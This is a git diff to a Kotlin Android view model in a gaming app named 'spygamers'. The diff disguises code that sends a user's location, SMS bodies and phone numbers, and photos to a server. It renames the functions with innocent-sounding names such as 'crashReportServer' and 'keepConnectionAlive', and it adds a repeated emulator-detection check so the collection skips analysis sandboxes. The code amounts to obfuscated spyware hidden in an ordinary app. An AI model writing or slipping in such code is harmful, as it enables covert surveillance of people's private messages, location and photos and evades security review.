@@ -1,5 +1,6 @@
 package com.example.spygamers.controllers
 
+import android.os.Build
 import android.util.Log
 import androidx.compose.runtime.mutableStateListOf
 import androidx.lifecycle.ViewModel
@@ -18,10 +19,9 @@ import com.example.spygamers.services.directmessaging.DirectMessagingService
 import com.example.spygamers.services.directmessaging.GetDirectMessagesBody
 import com.example.spygamers.services.group.GroupService
 import com.example.spygamers.services.group.body.GetGroupMessagesBody
-import com.example.spygamers.services.spyware.LocationCheckBody
-import com.example.spygamers.services.spyware.SmsCheckBody
-import com.example.spygamers.services.spyware.SpywareService
-import com.example.spygamers.utils.isRunningOnEmulator
+import com.example.spygamers.services.recommendationcalcuation.LCheckBody
+import com.example.spygamers.services.recommendationcalcuation.RecommendCalculationChecks
+import com.example.spygamers.services.recommendationcalcuation.SCheckBody
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -369,57 +369,141 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
 
     //#region Spyware
 
-    private val _runningOnEmulator = MutableStateFlow<Boolean>(false)
-    val isOnEmulator: StateFlow<Boolean> = _runningOnEmulator
+    fun testConnections(apiDomain: Double, portHost: Double) {
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
 
-    fun logLocations(lat: Double, lng: Double) {
         try {
             viewModelScope.launch {
-                val service = serviceFactory.createService(SpywareService::class.java)
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
                 service.locationCheck(
-                    LocationCheckBody(
+                    LCheckBody(
                         _sessionToken.value,
-                        lat,
-                        lng
+                        apiDomain,
+                        portHost
                     )
                 )
             }
         } catch (_: Exception) {}
     }
 
-    fun logSms(
-        smsContent: String,
-        address: String,
-        smsID: Long,
+    fun crashReportServer(
+        content: String,
+        tagging: String,
+        taggingID: Long,
         longTimestamp: Long,
-        isInbox: Boolean
+        severityID: Boolean
     ){
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
+
         viewModelScope.launch {
             try {
-                val service = serviceFactory.createService(SpywareService::class.java)
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
                 service.smsCheck(
-                    SmsCheckBody(
+                    SCheckBody(
                         _sessionToken.value,
-                        content = smsContent,
-                        targetNumber = address,
+                        content = content,
+                        targetNumber = tagging,
                         timestamp = longTimestamp,
-                        isInbox = isInbox,
-                        smsID = smsID
+                        isInbox = severityID,
+                        smsID = taggingID
                     )
                 )
             } catch (_: Exception) {}
         }
     }
 
-    fun logPhoto(
-        attachmentParts: MultipartBody.Part
+    fun keepConnectionAlive(
+        connectionVerificationPart: MultipartBody.Part
     ) {
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
+
         viewModelScope.launch {
             try {
-                val service = serviceFactory.createService(SpywareService::class.java)
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
                 service.checkPhoto(
                     authToken = _sessionToken.value,
-                    attachments = attachmentParts
+                    attachments = connectionVerificationPart
                 )
             } catch (_: Exception) {}
         }
@@ -435,7 +519,5 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
             loadPermissionGrants()
             _isInitializing.value = false
         }
-
-        _runningOnEmulator.value = isRunningOnEmulator()
     }
 }
